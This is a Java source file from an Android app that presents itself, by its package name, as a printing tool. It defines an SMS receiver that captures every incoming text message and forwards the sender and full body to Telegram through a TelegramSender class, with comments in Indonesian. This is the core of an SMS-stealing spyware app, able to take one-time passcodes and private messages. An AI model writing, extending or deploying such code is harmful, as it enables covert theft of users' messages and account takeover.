package com.cetakpro.print;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            // ✅ FIX: Gunakan API terbaru
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            
            if (messages == null || messages.length == 0) {
                return;
            }
            
            for (SmsMessage msg : messages) {
                String sender = msg.getOriginatingAddress();
                String messageBody = msg.getMessageBody();
                
                Log.d(TAG, "📱 SMS dari: " + sender);
                
                String title = "📱 SMS dari " + (sender != null ? sender : "Unknown");
                TelegramSender.sendMessage(context, title, messageBody);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }
}
